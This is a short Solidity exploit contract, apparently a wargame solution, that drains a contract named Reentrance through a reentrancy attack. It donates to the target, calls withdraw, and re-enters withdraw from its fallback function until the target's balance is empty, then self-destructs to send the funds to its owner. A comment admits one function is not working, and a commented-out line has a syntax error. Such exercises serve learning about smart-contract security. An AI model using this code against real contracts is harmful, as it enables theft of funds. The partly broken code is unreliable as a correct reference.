//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract Attack {
    Reentrance target;
    address payable public owner;
    uint256 public amount;

    // uint256 public amount = 0.01 ether;

    constructor(address payable _target_address, uint _amount) public {
        owner = msg.sender;
        amount = _amount;
        target = Reentrance(_target_address);
    }

    // not working don't know why
    function donateToTarget() public payable {
        target.donate{value: amount}(address(this));
    }

    function attack() external payable {
        target.withdraw(amount);
    }

    fallback() external payable {
        if (address(target).balance != 0) {
            target.withdraw(amount);
        }
    }

    // function getBalance() public view returns (uint) {
    //     return address.(this).balance;
    // }
    function destroy() public {
        selfdestruct(owner);
    }
}
